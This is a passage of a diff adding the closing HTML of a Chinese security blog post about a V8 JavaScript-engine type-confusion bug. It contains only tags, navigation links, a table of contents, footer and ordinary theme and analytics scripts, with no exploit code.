+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/10/RealWorldCTF-Quals-2019-accessible/" rel="prev" title="从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化">
+      <i class="fa fa-chevron-left"></i> 从RealWorldCTF Quals 2019 - accessible学习V8对property access的优化
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/" rel="next" title="华为CTF2020第一场_qemuzzz_1">
+      华为CTF2020第一场_qemuzzz_1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JIT"><span class="nav-number">2.1.</span> <span class="nav-text">JIT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MAP"><span class="nav-number">2.2.</span> <span class="nav-text">MAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%EF%BC%88Type-Confusion%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">类型混淆（Type Confusion）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#V8%E7%9A%84%E6%95%B0%E7%BB%84"><span class="nav-number">2.4.</span> <span class="nav-text">V8的数组</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Array-0-%E5%92%8Cnew-Array-0-%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.4.1.</span> <span class="nav-text">Array(0)和new Array(0)和[]的区别</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%87%E5%85%A5%E7%82%B9"><span class="nav-number">3.1.</span> <span class="nav-text">切入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E5%AE%9E%E9%AA%8C"><span class="nav-number">3.2.</span> <span class="nav-text">小实验</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-number">3.2.1.</span> <span class="nav-text">实验总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JIT%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.4.</span> <span class="nav-text">JIT代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.5.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%84%9F%E6%83%B3"><span class="nav-number">4.</span> <span class="nav-text">0x03 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
